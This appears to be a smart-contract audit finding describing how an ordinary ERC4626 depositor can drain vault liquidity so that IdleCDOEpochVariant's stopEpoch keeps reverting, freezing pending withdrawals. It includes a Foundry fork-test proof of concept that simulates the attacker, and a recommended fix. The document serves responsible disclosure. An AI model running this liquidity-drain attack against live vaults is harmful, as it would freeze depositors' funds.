### Title
Expired programmable-borrower epoch can remain unsettled when ERC4626 liquidity is unavailable - ([File: contracts/IdleCDOEpochVariant.sol](contracts/IdleCDOEpochVariant.sol))

### Summary
An unprivileged user of the programmable borrower’s ERC4626 vault can drain the vault’s currently withdrawable liquidity around epoch expiry, causing every `stopEpoch` attempt to revert before reaching the borrower-default path and leaving pending withdrawal receipts temporarily frozen. [1](#0-0) [2](#0-1) 

### Finding Description
`IdleCDOEpochVariant.startEpoch` parks the programmable borrower’s idle underlying balance in its configured ERC4626 vault and marks borrower accounting active. [3](#0-2)  When the epoch expires, `_stopEpoch` calls `ProgrammableBorrower.onStopEpoch` before attempting to pull funds from the borrower adapter. [4](#0-3) 

`onStopEpoch` distinguishes insolvency from a withdrawal failure: if the required shortfall exceeds the vault position’s asset value, it returns `true` so the later `transferFrom` can fail and trigger default handling. [5](#0-4)  If the vault position still economically covers the shortfall but cannot currently return that liquidity, `vault.withdraw` throws and the hook reverts with `StopEpochVaultLiquidityUnavailable`. [6](#0-5) 

That hook call is outside the `try`/`catch` surrounding `getFundsFromBorrower`, so the revert propagates through the entire `stopEpoch` transaction instead of entering `_handleBorrowerDefault`. [2](#0-1) [7](#0-6)  Consequently, `isEpochRunning` remains true, deposits and withdrawal requests remain disabled, and pending receipts remain unfunded. [8](#0-7) [9](#0-8) 

The behavior is already explicitly encoded by the test asserting that a liquidity-limited vault leaves the epoch running and leaves `pendingWithdraws` unchanged, but there is no expiry-grace deadline or other unprivileged path that eventually converts persistent illiquidity into a default. [10](#0-9) 

### Impact Explanation
The impact is temporary freezing of all funds whose settlement depends on the expired epoch, including the full `pendingWithdraws` amount and active tranche NAV that cannot enter the withdrawal queue while `isEpochRunning` remains true. [11](#0-10) [12](#0-11)  For example, with 10,000 underlying deposited and a 5,000 pending receipt, an externally drained vault can repeatedly make the post-expiry `stopEpoch` call revert while the programmable borrower still reports at least 5,000 assets of vault value, leaving the 5,000 receipt and the remaining active position unsettled until external vault liquidity returns. [1](#0-0) [13](#0-12) 

### Likelihood Explanation
An attacker only needs to be an ordinary shareholder/depositor of the configured ERC4626 vault and cause the liquid assets available to withdrawals to fall below the stop-epoch shortfall while the programmable borrower’s shares remain economically backed. [1](#0-0)  This is most feasible when pending withdrawals are large relative to immediately withdrawable vault liquidity or when the external vault allocates deposits into illiquid markets; it cannot produce a false hard default unless the vault position itself no longer covers the shortfall. [14](#0-13) 

### Recommendation
Introduce a bounded post-expiry settlement or challenge window rather than allowing a retryable external-vault liquidity failure to block settlement indefinitely. [11](#0-10) [6](#0-5)  If `onStopEpoch` remains unable to source covered funds after that deadline, the epoch should enter a defined insolvency/default-settlement path or permit a proportional share redemption that crystallizes the recoverable amount instead of repeatedly reverting before state changes. [7](#0-6) [15](#0-14) 

### Proof of Concept
The following Foundry fork test extends the existing programmable-borrower setup and models the attacker as a large unprivileged ERC4626 participant who drains the vault’s withdrawable liquidity after the epoch expires:

```solidity
function testExpiredEpochCannotStopAfterExternalVaultLiquidityDrain() external {
    uint256 amount = 10_000 * oneScale;
    address liquidityAttacker = makeAddr("external-vault-user");

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(amount);

    // Create a borrower-funded withdrawal liability before the epoch starts.
    uint256 receipt = cdoEpoch.requestWithdraw(
        aaTranche.balanceOf(address(this)) / 2,
        address(aaTranche)
    );
    assertGt(receipt, 0);

    _startEpochAndCheckPrices(0);
    assertGt(
        morphoVault.convertToAssets(
            morphoVault.balanceOf(address(programmableBorrower))
        ),
        receipt
    );

    /*
     * Unprivileged external-vault action:
     * the attacker acquires a sufficiently large ERC4626 position and withdraws
     * the maximum amount currently available. This can consume the vault's
     * liquid assets while leaving the programmable borrower's shares backed by
     * illiquid allocations.
     */
    uint256 attackerDeposit = morphoVault.totalAssets() * 100;
    deal(USDC, liquidityAttacker, attackerDeposit);

    vm.startPrank(liquidityAttacker);
    IERC20Detailed(USDC).approve(address(morphoVault), attackerDeposit);
    morphoVault.deposit(attackerDeposit, liquidityAttacker);
    morphoVault.withdraw(
        morphoVault.maxWithdraw(liquidityAttacker),
        liquidityAttacker,
        liquidityAttacker
    );
    vm.stopPrank();

    vm.warp(cdoEpoch.epochEndDate() + 1);

    // Still solvent on a convertToAssets basis, but unable to return `receipt`
    // as immediately withdrawable underlying.
    assertGe(
        morphoVault.convertToAssets(
            morphoVault.balanceOf(address(programmableBorrower))
        ),
        receipt
    );

    vm.prank(manager);
    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.isEpochRunning());
    assertFalse(cdoEpoch.defaulted());
    assertEq(strategy.pendingWithdraws(), receipt);

    // The receipt remains epoch-gated and cannot be paid while settlement reverts.
    vm.expectRevert(NotAllowed.selector);
    cdoEpoch.claimWithdrawRequest();
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-223)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L244-250)
```text
    isEpochRunning = true;
    // prevent deposits
    _pause();

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;
```

**File:** contracts/IdleCDOEpochVariant.sol (L338-345)
```text
    _checkNotAllowed(
      // Check that epoch is running
      !isEpochRunning || 
      // Check that end date is passed
      block.timestamp < epochEndDate || 
      // Check that there are no pending instant withdraws, ie `getInstantWithdrawFunds` was called
      // before closing the epoch
      _pendingInstant() != 0 ||
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-405)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L576-599)
```text
  /// @notice Handle borrower default
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L320-328)
```text
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
```

**File:** test/foundry/ProgrammableBorrowerCreditVault.t.sol (L385-398)
```text
    uint256 pendingWithdraws = strategy.pendingWithdraws();
    assertGt(pendingWithdraws, 1, "stop epoch should need liquidity recall");
    assertGe(limitedVault.convertToAssets(limitedVault.balanceOf(address(programmableBorrower))), pendingWithdraws);
    limitedVault.setWithdrawLimit(pendingWithdraws - 1);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.expectRevert(abi.encodeWithSelector(StopEpochVaultLiquidityUnavailable.selector));
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    assertFalse(cdoEpoch.defaulted(), "vault liquidity failure should not default");
    assertTrue(cdoEpoch.isEpochRunning(), "epoch should remain running after retryable failure");
    assertTrue(programmableBorrower.epochAccountingActive(), "borrower accounting should remain active");
    assertEq(strategy.pendingWithdraws(), pendingWithdraws, "withdraw requests should remain pending");
```
